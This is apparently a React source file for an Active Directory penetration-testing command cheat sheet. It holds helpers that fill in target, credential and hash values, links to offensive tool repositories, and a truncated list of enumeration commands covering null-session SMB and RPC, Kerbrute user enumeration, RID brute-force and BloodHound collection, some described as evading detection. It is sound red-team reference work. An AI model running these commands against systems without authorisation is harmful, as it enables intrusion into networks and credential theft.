import React, { useState, useMemo, useEffect } from "react";
import {
  Search,
  Copy,
  Check,
  Terminal,
  ChevronRight,
  Pencil,
  FolderTree,
  Sun,
  Moon,
  Menu,
  X,
  Github,
  ExternalLink,
  GitBranch,
  BookOpen,
  ShieldAlert,
  Workflow,
} from "lucide-react";

// ============================================================
// DESIGN TOKENS
// Signature: the literal Directory Information Tree (DIT) — AD's
// own term for its hierarchical data structure — rendered as real
// box-drawing glyphs rather than decorative icons. Type pairing is
// IBM Plex Mono (headers, identifiers, code) + IBM Plex Sans (body
// prose), chosen because Plex was designed for IBM's own enterprise
// systems identity — a deliberate fit for "enterprise directory
// services" rather than the default JetBrains-Mono-everywhere look.
// ============================================================
const FONT_MONO = "'IBM Plex Mono', ui-monospace, 'SF Mono', Menlo, monospace";
const FONT_SANS = "'IBM Plex Sans', ui-sans-serif, system-ui, sans-serif";
const SIGNATURE = "#C9975B"; // aged brass / terminal-phosphor amber — the one bold accent, constant across themes
// Structural/text/border tokens resolve through CSS custom properties so the
// day/night toggle (data-theme on the root) repaints every component that
// already uses these constants, without threading theme state through props.
const VOID = "var(--void)";
const SURFACE = "var(--surface)";
const STRUCTURAL = "var(--structural)";
const TEXT_PRIMARY = "var(--text-primary)";
const TEXT_BODY = "var(--text-body)";
const TEXT_COMMAND = "var(--text-command)";
const TEXT_FAINT = "var(--text-faint)";
const BORDER_0 = "var(--border-0)";
const BORDER_1 = "var(--border-1)";
const BORDER_2 = "var(--border-2)";
const BORDER_3 = "var(--border-3)";

function GlobalStyle() {
  return (
    <style>{`
      @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap');

      .ad-arsenal-root {
        --void: #0B0E12;
        --surface: #12161C;
        --structural: #5B6470;
        --text-primary: #F2F4F6;
        --text-body: #9CA3AF;
        --text-command: #D8DEE9;
        --text-faint: #4B5158;
        --border-0: rgba(255,255,255,0.05);
        --border-1: rgba(255,255,255,0.06);
        --border-2: rgba(255,255,255,0.08);
        --border-3: rgba(255,255,255,0.1);
      }
      .ad-arsenal-root[data-theme="light"] {
        --void: #F6F4F0;
        --surface: #FFFFFF;
        --structural: #6B7280;
        --text-primary: #181A1D;
        --text-body: #4B5563;
        --text-command: #20242A;
        --text-faint: #8B94A0;
        --border-0: rgba(0,0,0,0.05);
        --border-1: rgba(0,0,0,0.07);
        --border-2: rgba(0,0,0,0.1);
        --border-3: rgba(0,0,0,0.14);
      }

      .ad-arsenal-root ::selection { background: ${SIGNATURE}33; color: #F4E9DA; }
      .ad-arsenal-root input:focus-visible,
      .ad-arsenal-root button:focus-visible,
      .ad-arsenal-root a:focus-visible {
        outline: 2px solid ${SIGNATURE};
        outline-offset: 2px;
      }
      .ad-arsenal-root input::placeholder { color: var(--text-faint); opacity: 1; }
      @keyframes dit-line-in {
        from { opacity: 0; transform: translateX(-6px); }
        to { opacity: 1; transform: translateX(0); }
      }
      .dit-line { animation: dit-line-in 0.35s ease-out both; }
      .menu-drawer-backdrop { transition: opacity 200ms ease; }
      .menu-drawer-panel { transition: transform 220ms cubic-bezier(0.22, 1, 0.36, 1); }
      @media (prefers-reduced-motion: reduce) {
        .dit-line { animation: none; }
        .menu-drawer-backdrop, .menu-drawer-panel { transition: none; }
      }
    `}</style>
  );
}

// Literal Directory Information Tree hero — the signature element.
// Shows the real taxonomy (Commands/Attack Paths/Learnbook counts) as
// an actual tree structure, the same box-drawing notation `tree` or
// `dsquery` output uses, animating in once on load like a directory
// listing populating.
function DITHero({ counts }) {
  const rows = [
    { depth: 0, connector: "", label: "DC=arsenal", sub: null, color: TEXT_PRIMARY },
    { depth: 1, connector: "├──", label: `OU=Commands`, sub: `${counts.entries} entries`, color: "#5B9BD5" },
    { depth: 1, connector: "├──", label: `OU=AttackPaths`, sub: `${counts.edges} edges`, color: "#A57BD8" },
    { depth: 1, connector: "├──", label: `OU=AttackChains`, sub: `${counts.chains} chains`, color: "#8A9199" },
    { depth: 1, connector: "├──", label: `OU=Learnbook`, sub: `${counts.learn} topics`, color: "#3FBFA6" },
    { depth: 1, connector: "└──", label: `OU=CVEs`, sub: `${counts.cves} tracked`, color: "#E06C5C" },
  ];
  return (
    <div
      className="rounded-lg px-5 py-4"
      style={{ background: SURFACE, border: `1px solid ${BORDER_2}`, fontFamily: FONT_MONO }}
    >
      <p className="text-[10px] uppercase tracking-[0.14em] mb-2.5" style={{ color: STRUCTURAL }}>
        Directory Information Tree
      </p>
      {rows.map((r, i) => (
        <div
          key={i}
          className="dit-line flex items-baseline gap-2 text-[13px] sm:text-[14px] leading-[1.9]"
          style={{ animationDelay: `${i * 90}ms`, paddingLeft: r.depth * 18 }}
        >
          {r.connector && (
            <span style={{ color: STRUCTURAL }} aria-hidden="true">
              {r.connector}
            </span>
          )}
          <span style={{ color: r.color, fontWeight: r.depth === 0 ? 700 : 600 }}>{r.label}</span>
          {r.sub && (
            <span className="text-[11px]" style={{ color: STRUCTURAL }}>
              ({r.sub})
            </span>
          )}
        </div>
      ))}
    </div>
  );
}

// Variable slots editable in the top panel, in display order.
// key = token that appears in commands as $KEY, placeholder = shown in the input when empty.
const VARS = [
  { key: "TARGET", label: "Target", placeholder: "10.10.10.5" },
  { key: "DC", label: "Domain Controller", placeholder: "dc01.corp.local" },
  { key: "DOMAIN", label: "Domain", placeholder: "corp.local" },
  { key: "USER", label: "Username", placeholder: "juser" },
  { key: "PASS", label: "Password", placeholder: "Passw0rd!" },
  { key: "HASH", label: "NTLM Hash", placeholder: "aad3b435...:8846f7ea..." },
  { key: "SID", label: "Domain SID", placeholder: "S-1-5-21-..." },
  { key: "OUTFILE", label: "Output file", placeholder: "hashes.txt" },
  { key: "ATTACKER", label: "Attacker host/IP", placeholder: "10.10.14.2" },
  { key: "TARGETOBJECT", label: "Target user/object", placeholder: "victimuser" },
  { key: "INTERFACE", label: "Network interface", placeholder: "tun0" },
];

// Which shell dialect a command runs in, inferred from the tool/command —
// determines how filled-in variable values get quoted so special characters
// (like ! in a password) can't break the command or trigger bash history expansion.
function shellOf(entry) {
  const winTools = [
    "Rubeus", "Mimikatz", "PowerShell", "SharpHound", "SpoolSample", "reg /",
    "PingCastle", "ADRecon", "Group3r", "Snaffler", "nltest", "klist", "LaZagne",
    "comsvcs.dll", "DSInternals", "ntdsutil", "DomainPasswordSpray", "Certify",
    "Whisker", "SharpGPOAbuse", "LAPSToolkit", "Get-LapsADPassword", "Windows PrivEsc",
    "RunasCs", "SharpDPAPI", "RemotePotato0", "Inveigh", "PowerView", "AD Explorer",
    "Sapphire Ticket", "Invoke-AuthenticatedTimeRoast", "SOAPHound", "Invoke-GPOwned",
  ];
  if (winTools.some((t) => entry.tool.includes(t) || entry.command.includes(t))) return "win";
  if (entry.command.startsWith("MATCH") || entry.command.startsWith("#")) return "none";
  return "bash";
}

// Safely single-quote a value for bash. Embedded single quotes AND `!`
// are both broken out of the quoted segment and backslash-escaped —
// escaping `!` this way (rather than just single-quoting it) also
// defeats bash's interactive history expansion, so there's no
// "event not found" error regardless of the user's shell settings.
function bashQuote(value) {
  let out = "'";
  for (const ch of value) {
    if (ch === "'") out += `'\\''`;
    else if (ch === "!") out += `'\\!'`;
    else out += ch;
  }
  out += "'";
  return out;
}

// Basenames of actual Impacket example scripts — used to gate the .py ->
// impacket-* variant below so an unrelated tool that happens to be invoked as
// some-script.py (e.g. smartbrute.py, noPac.py) doesn't get a fake
// "impacket-<name>" binary suggested for it.
const IMPACKET_SCRIPT_NAMES = new Set([
  "secretsdump", "GetUserSPNs", "GetNPUsers", "GetTGT", "getST", "ticketer",
  "ticketConverter", "psexec", "wmiexec", "smbexec", "atexec", "ntlmrelayx",
  "addcomputer", "changepasswd", "dacledit", "describeTicket", "findDelegation",
  "GetADComputers", "GetADUsers", "lookupsid", "mssqlclient", "owneredit",
  "rbcd", "smbpasswd", "reg",
].map((s) => s.toLowerCase()));

// Some tools are invoked under more than one valid binary name depending on
// how they were installed or which OS/shell is being used. This returns every
// variant a command should be shown as, so Commands AND Attack Paths both stay
// in sync automatically instead of needing separate logic in each place.
//   - Impacket scripts: raw .py file (git clone) vs impacket-<Name> (apt/pipx)
//   - Certipy: the pip package is literally named certipy-ad (naming clash with
//     an unrelated PyPI package), so some installs expose `certipy`, others
//     only `certipy-ad`
//   - bloodyAD: Linux binary names are case-sensitive; packaging is inconsistent
//     between mixed-case `bloodyAD` and lowercase `bloodyad`
// Returns an array of { label, command }. A single-element array (label: null)
// means there's nothing else to show.
function getCommandVariants(command) {
  const pyMatch = command.match(/^([A-Za-z0-9]+)\.py\b/);
  if (pyMatch && IMPACKET_SCRIPT_NAMES.has(pyMatch[1].toLowerCase())) {
    return [
      { label: "Script (.py)", command },
      { label: "Package binary (impacket-*)", command: command.replace(/^([A-Za-z0-9]+)\.py\b/, `impacket-${pyMatch[1]}`) },
    ];
  }
  if (command.startsWith("certipy ")) {
    return [
      { label: "certipy", command },
      { label: "certipy-ad (pip package name)", command: command.replace(/^certipy /, "certipy-ad ") },
    ];
  }
  if (command.startsWith("bloodyAD ")) {
    return [
      { label: "bloodyAD (mixed-case)", command },
      { label: "bloodyad (lowercase, Linux)", command: command.replace(/^bloodyAD /, "bloodyad ") },
    ];
  }
  return [{ label: null, command }];
}

// If the operator has filled in $HASH but NOT $PASS, rewrite a command's
// auth portion to use that tool's actual hash-based auth flag instead of
// leaving $PASS as an unfilled placeholder. Verified per-tool (these flags
// are NOT interchangeable — e.g. bloodyAD reuses -p with a colon-prefixed
// hash, while NetExec/evil-winrm use a dedicated -H, and Impacket/Certipy
// use -hashes):
//   Impacket ($DOMAIN/$USER:$PASS@$TARGET) -> $DOMAIN/$USER@$TARGET -hashes :$HASH
//   bloodyAD/bloodyad (-p $PASS)           -> -p :$HASH   (same flag, hash value)
//   certipy/certipy-ad (-p $PASS)          -> -hashes :$HASH
//   nxc / evil-winrm (-p $PASS)            -> -H $HASH
// Anything not covered here is left as-is rather than guessed at.
function applyAuthPreference(command, values) {
  const hasHash = !!values.HASH;
  const hasPass = !!values.PASS;
  if (!hasHash || hasPass) return command;

  if (command.includes("$DOMAIN/$USER:$PASS@")) {
    return command.replace("$DOMAIN/$USER:$PASS@", "$DOMAIN/$USER@") + " -hashes :$HASH";
  }
  if (/^bloodyad /i.test(command) && command.includes(" -p $PASS")) {
    return command.replace(" -p $PASS", " -p :$HASH");
  }
  if (/^certipy(-ad)? /.test(command) && command.includes(" -p $PASS")) {
    return command.replace(" -p $PASS", " -hashes :$HASH");
  }
  if ((command.startsWith("nxc ") || command.startsWith("evil-winrm ")) && command.includes(" -p $PASS")) {
    return command.replace(" -p $PASS", " -H $HASH");
  }
  return command;
}

// Replace $KEY tokens with live values. Sorted longest-key-first so $TARGET
// never eats into $TARGETOBJECT.
function substitute(command, values, shell) {
  const sortedVars = [...VARS].sort((a, b) => b.key.length - a.key.length);
  let result = command;
  for (const v of sortedVars) {
    const val = values[v.key];
    if (val) {
      const replacement = shell === "bash" ? bashQuote(val) : val;
      result = result.split(`$${v.key}`).join(replacement);
    }
  }
  return result;
}

const PHASES = [
  { id: "recon", label: "Enumeration", dc: "DC=recon", color: "#5B9BD5", bg: "rgba(91,155,213,0.08)" },
  { id: "cred", label: "Credential Access", dc: "DC=credaccess", color: "#E0A937", bg: "rgba(224,169,55,0.08)" },
  { id: "lateral", label: "Lateral Movement", dc: "DC=lateral", color: "#A57BD8", bg: "rgba(165,123,216,0.08)" },
  { id: "pivot", label: "Pivoting", dc: "DC=pivot", color: "#5FBF7A", bg: "rgba(95,191,122,0.08)" },
  { id: "c2", label: "C2 Frameworks", dc: "DC=c2", color: "#D9825C", bg: "rgba(217,130,92,0.08)" },
  { id: "privesc", label: "Privilege Escalation", dc: "DC=privesc", color: "#3FBFA6", bg: "rgba(63,191,166,0.08)" },
  { id: "persist", label: "Persistence", dc: "DC=persist", color: "#E06C5C", bg: "rgba(224,108,92,0.08)" },
  { id: "evasion", label: "Defense Evasion", dc: "DC=evasion", color: "#8A9199", bg: "rgba(138,145,153,0.08)" },
];

const phaseOf = (id) => PHASES.find((p) => p.id === id);

// GitHub source for every open-source tool referenced across ENTRIES, keyed by
// the exact string that would otherwise be shown as entry.tool. Grouped/combo
// labels (Impacket scripts, GTFOBins binaries, Windows PrivEsc sub-tools, and
// "A / B" combo labels) are resolved by repoFor() below instead of being
// listed here one-by-one. Native OS binaries (net, nltest, reg, klist,
// ntdsutil, rpcclient...), built-in cmdlets (Get-ADUser, Set-ADAccountPassword...),
// and bare technique/CVE names with no canonical tool repo are deliberately
// left unmapped rather than pointed at a guessed URL.
const TOOL_REPOS = {
  "AADInternals": "https://github.com/Gerenios/AADInternals",
  "AD Explorer": "https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer",
  "ADRecon": "https://github.com/adrecon/ADRecon",
  "AdaptixC2": "https://github.com/Adaptix-Framework/AdaptixC2",
  "ASRepCatcher": "https://github.com/Yaxxine7/ASRepCatcher",
  "AzureHound": "https://github.com/SpecterOps/AzureHound",
  "BOFHound": "https://github.com/coffeegist/bofhound",
  "BloodHound": "https://github.com/SpecterOps/BloodHound",
  "BloodHound-CE": "https://github.com/SpecterOps/BloodHound",
  "BloodHound-CE (bloodhound-python)": "https://github.com/dirkjanm/BloodHound.py",
  "Certify": "https://github.com/GhostPack/Certify",
  "Certipy": "https://github.com/ly4k/Certipy",
  "Chisel": "https://github.com/jpillora/chisel",
  "Coercer": "https://github.com/p0dalirius/Coercer",
  "DFSCoerce": "https://github.com/Wh04m1001/DFSCoerce",
  "DonPAPI": "https://github.com/login-securite/DonPAPI",
  "DSInternals": "https://github.com/MichaelGrafnetter/DSInternals",
  "Dumpert": "https://github.com/outflanknl/Dumpert",
  "GoldenGMSA": "https://github.com/Semperis/GoldenGMSA",
  "GPOddity": "https://github.com/ShutdownRepo/GPOddity",
  "GPOwned": "https://github.com/X-C3LL/GPOwned",
  "Group3r": "https://github.com/Group3r/Group3r",
  "Hashcat": "https://github.com/hashcat/hashcat",
  "Havoc": "https://github.com/HavocFramework/Havoc",
  "Inveigh": "https://github.com/Kevin-Robertson/Inveigh",
  "Invoke-GPOwned": "https://github.com/n0troot/Invoke-GPOwned",
  "JohnTheRipper": "https://github.com/magnumripper/JohnTheRipper",
  "Invoke-SessionHunter": "https://github.com/Leo4j/SessionHunter",
  "Invoke-noPac": "https://github.com/Ridter/noPac",
  "Kerbrute": "https://github.com/ropnop/kerbrute",
  "kerberoast (skelsec)": "https://github.com/skelsec/kerberoast",
  "modifyCertTemplate": "https://github.com/fortalice/modifyCertTemplate",
  "LAPSToolkit": "https://github.com/leoloobeek/LAPSToolkit",
  "LDAPDomainDump": "https://github.com/dirkjanm/ldapdomaindump",
  "LaZagne": "https://github.com/AlessandroZ/LaZagne",
  "Ligolo-ng": "https://github.com/nicocha30/ligolo-ng",
  "Mimikatz": "https://github.com/gentilkiwi/mimikatz",
  "NetExec (nxc)": "https://github.com/Pennyw0rth/NetExec",
  "Nmap": "https://github.com/nmap/nmap",
  "PKINITtools (gettgtpkinit.py)": "https://github.com/dirkjanm/PKINITtools",
  "PetitPotam": "https://github.com/topotam/PetitPotam",
  "PingCastle": "https://github.com/vletoux/pingcastle",
  "PassTheCert": "https://github.com/AlmondOffSec/PassTheCert",
  "Pcredz": "https://github.com/lgandx/PCredz",
  "PowerHuntShares": "https://github.com/NetSPI/PowerHuntShares",
  "pyGPOabuse": "https://github.com/Hackndo/pyGPOAbuse",
  "PowerView": "https://github.com/PowerShellMafia/PowerSploit",
  "PowerView / ActiveDirectory module": "https://github.com/PowerShellMafia/PowerSploit",
  "PowerView.py (aniqfakhrul)": "https://github.com/aniqfakhrul/powerview.py",
  "PowerShell": "https://github.com/PowerShell/PowerShell",
  "PowerShell Remoting": "https://github.com/PowerShell/PowerShell",
  "PrivExchange": "https://github.com/dirkjanm/PrivExchange",
  "ROADtools (roadrecon)": "https://github.com/dirkjanm/ROADtools",
  "RemotePotato0": "https://github.com/antonioCoco/RemotePotato0",
  "Responder": "https://github.com/lgandx/Responder",
  "Rubeus": "https://github.com/GhostPack/Rubeus",
  "Rubeus / SpoolSample": "https://github.com/GhostPack/Rubeus",
  "RunasCs": "https://github.com/antonioCoco/RunasCs",
  "Sapphire Ticket": "https://github.com/Semperis/SapphireTicket",
  "SCCMHunter": "https://github.com/garrettfoster13/sccmhunter",
  "SafetyKatz": "https://github.com/GhostPack/SafetyKatz",
  "SharpDPAPI": "https://github.com/GhostPack/SharpDPAPI",
  "SharpGPOAbuse": "https://github.com/FSecureLABS/SharpGPOAbuse",
  "SharpKatz": "https://github.com/b4rtik/SharpKatz",
  "SharpSCCM": "https://github.com/Mayyhem/SharpSCCM",
  "ShadowCoerce": "https://github.com/ShutdownRepo/ShadowCoerce",
  "Sliver": "https://github.com/BishopFox/sliver",
  "smartbrute": "https://github.com/ShutdownRepo/smartbrute",
  "SOAPHound": "https://github.com/FalconForceTeam/SOAPHound",
  "Timeroast": "https://github.com/SecuraBV/Timeroast",
  "timecrack (Timeroast)": "https://github.com/SecuraBV/Timeroast",
  "Snaffler": "https://github.com/SnaffCon/Snaffler",
  "TokenTactics": "https://github.com/rvrsh3ll/TokenTactics",
  "UACME": "https://github.com/hfiref0x/UACME",
  "WSUSpect / pywsus": "https://github.com/GoSecure/pywsus",
  "Whisker": "https://github.com/eladshamir/Whisker",
  "Zerologon (CVE-2020-1472)": "https://github.com/dirkjanm/CVE-2020-1472",
  "adidnsdump": "https://github.com/dirkjanm/adidnsdump",
  "bloodyAD": "https://github.com/CravateRouge/bloodyAD",
  "dnstool.py (krbrelayx)": "https://github.com/dirkjanm/krbrelayx",
  "krbrelayx": "https://github.com/dirkjanm/krbrelayx",
  "evil-winrm": "https://github.com/Hackplayers/evil-winrm",
  "gpp-decrypt": "https://github.com/t0thkr1s/gpp-decrypt",
  "pypykatz": "https://github.com/skelsec/pypykatz",
  "pywhisker": "https://github.com/ShutdownRepo/pywhisker",
  "reg / Mimikatz": "https://github.com/gentilkiwi/mimikatz",
  "rpcclient": "https://github.com/samba-team/samba",
  "smbclient": "https://github.com/samba-team/samba",
  "smbmap": "https://github.com/ShawnDEvans/smbmap",
  "windapsearch": "https://github.com/ropnop/windapsearch",
  "xfreerdp": "https://github.com/FreeRDP/FreeRDP",
  "faketime + noPac": "https://github.com/Ridter/noPac",
  "noPac": "https://github.com/Ridter/noPac",
  "proxychains + SSH": "https://github.com/rofl0r/proxychains-ng",
};

// Sub-tool -> repo for the combined "Windows PrivEsc: <tool>" labels.
const WIN_PRIVESC_REPOS = {
  "WinPEAS": "https://github.com/carlospolop/PEASS-ng",
  "PowerUp": "https://github.com/HarmJ0y/PowerUp",
  "PrintSpoofer": "https://github.com/itm4n/PrintSpoofer",
  "GodPotato": "https://github.com/BeichenDream/GodPotato",
};

// Resolves entry.tool -> a GitHub (or, for closed-source Sysinternals tools,
// vendor docs) URL, or null when there's no canonical link worth showing
// (native OS binaries, built-in cmdlets, bare CVE/technique names).
function repoFor(tool) {
  if (tool.startsWith("Impacket")) return "https://github.com/fortra/impacket";
  if (tool.startsWith("GTFOBins")) return "https://github.com/GTFOBins/GTFOBins.github.io";
  if (tool.startsWith("PKINITtools")) return "https://github.com/dirkjanm/PKINITtools";
  if (tool.startsWith("Windows PrivEsc: ")) {
    const sub = tool.replace("Windows PrivEsc: ", "");
    return WIN_PRIVESC_REPOS[sub] || null;
  }
  return TOOL_REPOS[tool] || null;
}

// Variable convention used throughout every command:
// $TARGET = target host/IP   $DC = domain controller host/IP   $DOMAIN = domain name (corp.local)
// $USER = username   $PASS = password   $HASH = NTLM hash   $SID = domain SID   $OUTFILE = output filename

const ENTRIES = [
  // ============ ENUMERATION ============
  {
    id: "nmap-ad-ports",
    tool: "Nmap",
    phase: "recon",
    title: "Discover AD-relevant services",
    command: "nmap -p 53,88,135,139,389,445,464,593,636,3268,3269 -sV -Pn $TARGET",
    description: "Scans the specific ports AD services live on: DNS, Kerberos, RPC, NetBIOS, LDAP/LDAPS, kpasswd, Global Catalog.",
    useCase: "Fast way to confirm a host is a domain controller and see which AD services are exposed.",
  },
  {
    id: "nmap-full-sweep",
    tool: "Nmap",
    phase: "recon",
    title: "Full TCP port sweep",
    command: "nmap -p- -T4 -Pn -oA nmap_$TARGET $TARGET",
    description: "Scans all 65535 TCP ports and saves output in all formats (normal/xml/grepable).",
    useCase: "Catching non-standard services before deciding where to focus enumeration.",
  },
  {
    id: "nmap-smb-scripts",
    tool: "Nmap",
    phase: "recon",
    title: "SMB enumeration via NSE scripts",
    command: "nmap --script \"smb-enum-shares,smb-enum-users,smb-os-discovery,smb2-security-mode\" -p 445 $TARGET",
    description: "Runs Nmap's built-in SMB scripts to list shares, users, OS version, and whether SMB signing is enforced.",
    useCase: "Quick unauthenticated SMB recon and checking if SMB signing is disabled (relay-able).",
  },
  {
    id: "nmap-ldap-rootdse",
    tool: "Nmap",
    phase: "recon",
    title: "Pull LDAP rootDSE anonymously",
    command: "nmap -p 389 --script ldap-rootdse $TARGET",
    description: "Queries the LDAP root DSE, which often leaks the domain naming context and server info without authentication.",
    useCase: "Confirming domain name and DC role before you have any credentials.",
  },
  {
    id: "nmap-vuln-smb",
    tool: "Nmap",
    phase: "recon",
    title: "Check for known SMB vulnerabilities",
    command: "nmap --script smb-vuln* -p 445 $TARGET",
    description: "Runs Nmap's SMB vulnerability-detection scripts (EternalBlue, MS08-067, SMBGhost, etc.) against the target.",
    useCase: "Quick triage for unpatched legacy hosts before deeper exploitation attempts.",
  },
  {
    id: "smbclient-list-null",
    tool: "smbclient",
    phase: "recon",
    title: "List shares — null/anonymous session",
    command: "smbclient -L //$TARGET -N",
    description: "Attempts to list SMB shares with no credentials at all.",
    useCase: "First check on any SMB host — many environments still allow anonymous share listing.",
  },
  {
    id: "smbclient-list-auth",
    tool: "smbclient",
    phase: "recon",
    title: "List shares — authenticated",
    command: "smbclient -L //$TARGET -U $DOMAIN/$USER%$PASS",
    description: "Lists all SMB shares visible to a specific domain account.",
    useCase: "Once you have any valid credential, always re-check shares — visibility changes per account.",
  },
  {
    id: "smbclient-connect",
    tool: "smbclient",
    phase: "recon",
    title: "Connect to a specific share",
    command: "smbclient //$TARGET/SHARE -U $DOMAIN/$USER%$PASS",
    description: "Opens an interactive FTP-like session on a chosen share (get/put/ls/cd).",
    useCase: "Browsing a share you found (e.g. SYSVOL, NETLOGON, or a fileshare) for scripts, creds, or config files.",
  },
  {
    id: "smbmap",
    tool: "smbmap",
    phase: "recon",
    title: "Enumerate share permissions",
    command: "smbmap -H $TARGET -u $USER -p $PASS",
    description: "Lists every share along with your read/write permission level on each — smbclient doesn't show this at a glance.",
    useCase: "Quickly spotting writable shares, which are common footholds for planting payloads or GPO abuse.",
  },
  {
    id: "smbmap-recurse",
    tool: "smbmap",
    phase: "recon",
    title: "Recursively list share contents",
    command: "smbmap -H $TARGET -u $USER -p $PASS -R SHARE --depth 5",
    description: "Walks a share's directory tree looking for interesting files.",
    useCase: "Hunting for passwords in scripts, unattend.xml, or config files buried in a share.",
  },
  {
    id: "enum4linux-ng",
    tool: "enum4linux-ng",
    phase: "recon",
    title: "Full SMB/RPC enumeration",
    command: "enum4linux-ng -A $TARGET -u $USER -p $PASS -oY enum_$TARGET.yaml",
    description: "Modern rewrite of enum4linux — pulls users, groups, shares, password policy, and OS info via SMB/RPC.",
    useCase: "One-stop enumeration pass early in an engagement, before switching to targeted tools.",
  },
  {
    id: "rpcclient-null",
    tool: "rpcclient",
    phase: "recon",
    title: "Null session RPC enumeration",
    command: "rpcclient -U '' -N $TARGET",
    description: "Opens an RPC session with no credentials; once inside, use enumdomusers, querydominfo, enumdomgroups.",
    useCase: "Testing whether null sessions are still allowed — a classic but still-common misconfiguration.",
  },
  {
    id: "kerbrute-userenum",
    tool: "Kerbrute",
    phase: "recon",
    title: "Enumerate valid usernames via Kerberos",
    command: "kerbrute userenum -d $DOMAIN --dc $DC users.txt -o valid_users.txt",
    description: "Abuses Kerberos pre-auth error codes to confirm valid usernames without triggering failed-logon events (4625).",
    useCase: "Building a validated username list quietly before password spraying.",
  },
  {
    id: "sharphound",
    tool: "BloodHound / SharpHound",
    phase: "recon",
    title: "Collect AD relationship data (Windows)",
    command: "SharpHound.exe -c All -d $DOMAIN --outputdirectory C:\\Temp",
    description: "Walks the domain over LDAP and SMB, mapping users, groups, sessions, ACLs and trust relationships into a graph.",
    useCase: "Primary recon step — reveals attack paths to Domain Admin that manual enumeration misses.",
  },
  {
    id: "bloodhound-python",
    tool: "BloodHound-CE (bloodhound-python)",
    phase: "recon",
    title: "Collect AD data from Linux",
    command: "bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip",
    description: "Python collector equivalent of SharpHound — no need for a Windows box, outputs a zip ready for BloodHound-CE ingestion.",
    useCase: "Running BloodHound collection from a Linux attack host or C2 without dropping .NET binaries.",
  },
  {
    id: "nxc-ldap-bloodhound",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Collect BloodHound data via LDAP (no separate collector)",
    command: "nxc ldap $TARGET -u $USER -p $PASS --bloodhound --collection All --dns-server $DC",
    description: "NetExec's built-in BloodHound collector — pulls the same data SharpHound/bloodhound-python would, straight over LDAP, without needing a separate tool staged. --dns-server is worth setting explicitly whenever the LDAP target's own DNS resolution can't be trusted.",
    useCase: "Fastest path to BloodHound data when nxc is already the tool in hand — one command instead of switching to a dedicated collector.",
  },
  {
    id: "soaphound-collect",
    tool: "SOAPHound",
    phase: "recon",
    title: "Collect AD data over ADWS instead of LDAP",
    command: "SOAPHound.exe --buildcache -c cache.txt --dc $DC -o output.json",
    description: "Collects the same kind of object/attribute data SharpHound does, but over Active Directory Web Services (ADWS, TCP 9389) instead of raw LDAP — traffic that blends in with routine RSAT/PowerShell AD module usage instead of standing out as bulk LDAP enumeration.",
    useCase: "BloodHound-equivalent recon in environments where LDAP querying is heavily logged or alerted on, without ever generating the LDAP traffic that detections are tuned for.",
  },
  {
    id: "bofhound-parse",
    tool: "BOFHound",
    phase: "recon",
    title: "Turn C2 LDAP-search output into BloodHound data",
    command: "bofhound -i ldapsearch_logs/ -o bloodhound_import/",
    description: "Parses the raw LDAP search output already produced by C2-framework BOFs (Cobalt Strike's ldapsearch BOF, Sliver, etc.) and converts it into BloodHound-CE-ingestible JSON — full graph data without ever running SharpHound, ADWS, or any dedicated collector.",
    useCase: "Building a BloodHound graph out of LDAP queries a C2 operator was already going to run for other reasons, when dropping any collector binary at all is too risky or restricted.",
  },
  {
    id: "bloodhound-ce-deploy",
    tool: "BloodHound-CE",
    phase: "recon",
    title: "Deploy BloodHound-CE via Docker",
    command: "curl -L https://ghst.ly/getbhce -o docker-compose.yml && docker compose up -d",
    description: "Spins up the BloodHound-CE stack (Postgres, Neo4j, API, web UI) locally for graph analysis.",
    useCase: "Standing up your own BloodHound-CE instance to ingest SharpHound/bloodhound-python collection data.",
  },
  {
    id: "windapsearch",
    tool: "windapsearch",
    phase: "recon",
    title: "Enumerate Domain Admins via LDAP",
    command: "python3 windapsearch.py --dc-ip $DC -u $USER@$DOMAIN -p $PASS --da",
    description: "Targeted LDAP queries for privileged group membership and nested group resolution.",
    useCase: "Quickly listing Domain Admins / nested admin groups without a full BloodHound collection.",
  },
  {
    id: "impacket-getadusers",
    tool: "Impacket (GetADUsers.py)",
    phase: "recon",
    title: "Dump all domain user objects",
    command: "GetADUsers.py $DOMAIN/$USER:$PASS -dc-ip $DC -all",
    description: "Lists every user object in the domain with attributes like last logon and password last set.",
    useCase: "Building a target user list, or spotting stale/service accounts worth prioritizing.",
  },
  {
    id: "impacket-lookupsid",
    tool: "Impacket (lookupsid.py)",
    phase: "recon",
    title: "RID brute-force user/group enumeration",
    command: "lookupsid.py $DOMAIN/$USER:$PASS@$TARGET",
    description: "Enumerates users and groups by brute-forcing RIDs over an authenticated (or sometimes null) SMB/RPC session.",
    useCase: "Alternative enumeration path when LDAP is locked down but SMB/RPC isn't.",
  },
  {
    id: "nxc-smb-shares",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Enumerate shares across hosts",
    command: "nxc smb $TARGET -u $USER -p $PASS --shares",
    description: "Lists shares and your access level on every host in scope in a single pass.",
    useCase: "Fast triage of writable/readable shares across an entire subnet.",
  },
  {
    id: "nxc-smb-users",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Enumerate domain users",
    command: "nxc smb $TARGET -u $USER -p $PASS --users",
    description: "Pulls the domain user list via SAMR from a single authenticated session.",
    useCase: "Quick username list without needing BloodHound or LDAP tooling.",
  },
  {
    id: "nxc-smb-groups",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Enumerate domain groups",
    command: "nxc smb $TARGET -u $USER -p $PASS --groups",
    description: "Lists domain groups and membership counts via SAMR.",
    useCase: "Spotting interesting groups (e.g. delegated admin groups) worth targeting.",
  },
  {
    id: "nxc-smb-passpol",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Pull password policy",
    command: "nxc smb $TARGET -u $USER -p $PASS --pass-pol",
    description: "Retrieves lockout threshold, minimum length, and complexity settings.",
    useCase: "Sets safe attempt limits before running a password spray to avoid lockouts.",
  },
  {
    id: "nxc-smb-ridbrute",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "RID brute-force (no creds needed)",
    command: "nxc smb $TARGET -u '' -p '' --rid-brute",
    description: "Brute-forces RIDs over a null session to enumerate users/groups without any valid credential.",
    useCase: "Username enumeration when you don't have creds yet and null sessions are allowed.",
  },
  {
    id: "nxc-smb-spider",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Crawl shares for interesting files",
